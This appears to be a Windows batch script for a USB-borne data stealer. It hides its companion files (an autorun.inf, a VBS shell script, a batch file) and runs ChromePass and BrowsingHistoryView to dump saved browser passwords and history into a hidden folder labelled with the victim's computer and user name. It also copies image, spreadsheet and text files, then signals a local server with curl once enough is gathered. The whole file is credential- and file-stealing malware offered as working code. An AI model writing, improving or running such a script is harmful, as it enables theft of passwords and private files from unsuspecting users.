@Echo off
setlocal enabledelayedexpansion
attrib +h +s +r \new_zip >nul
attrib +h +s +r \dangerFile.bat >nul
attrib +h +s +r \shell.vbs >nul
attrib +h +s +r \jerry.ico >nul
attrib +h +s +r \autorun.inf >nul

FOR %%A IN (%Date:/=%) DO SET Today=%%A
for /l %%a in (1,1,1) do if "!Today:~-1!"==" " set Today=!Today:~0,-1!
SET dynpathname=%TODAY%_%COMPUTERNAME%_%USERNAME%

Set "USB="
REM get removable loaded drives:
for /f "tokens=1-5" %%a in (
 'wmic logicaldisk list brief'
) do if %%b Equ 2 if %%d gtr 0 Set USB=!USB! %%a

FOR /F "tokens=3 USEBACKQ" %%F IN (`dir /-c /w %USB%`) DO set "size=%%F"
mkdir \data >nul
attrib +h +s +r \data >nul
setLocal EnableDelayedExpansion
@echo off
SET foldersize=0
SET folder="./data"

start \utilities\BrowsingHistoryView.exe /stext D:\data\BrowsingHistoryView__%DYNPATHNAME%.txt
start \utilities\ChromePass.exe /stext D:\data\ChromePass__%DYNPATHNAME%.txt

for %%a in (jpg png xls txt) do (
for /f "tokens=* delims= " %%f in ('dir/b/s/a-d c:\Testing') do (
SET foldersize=0
xcopy "%%f" \data\ /y /h /q >nul
call :calcSize

echo !foldersize!
if !foldersize! GTR 10240 (
curl localhost:3000/auth
exit /b
)))

attrib -h -s -r data\* >nul
:calcSize
 FOR /f "tokens=*" %%F IN ('dir /s/b %folder%') DO (call :calcAccSize "%%F")
:calcAccSize
 set /a foldersize+=(%~z1/1024)

